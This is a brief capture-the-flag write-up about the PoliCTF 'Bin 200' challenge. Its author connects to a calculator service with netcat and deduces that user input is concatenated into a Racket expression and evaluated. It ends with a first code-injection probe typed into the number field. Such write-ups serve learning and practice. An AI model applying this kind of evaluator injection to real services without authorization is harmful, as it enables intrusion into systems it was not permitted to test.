Bin 200 exposes a calculator application running on some port.

mah@mah-MacBookAir ~ % nc -p 9003 calc.challenges.polictf.it 4000
Write the first number:5

25

The calculator concatenates [Operator Text] [First Number Text] [Second Number Text] and runs a polish notation calculation on the text. The polish notation calculation is actually a racket evaluator. I imagine source logic sort of like:

echo "( $OPERATOR_TEXT $FIRST_NUMBER_TEXT $SECOND_NUMBER_TEXT )" | racket

Racket was determined by a few things. First consider Polish notation languages. The calculator handled fraction math and responded to scheme boolean functions with #t and #f. Racket from Scheme was distinguished creating an if statement with no else.

Write the first number:if #t 1
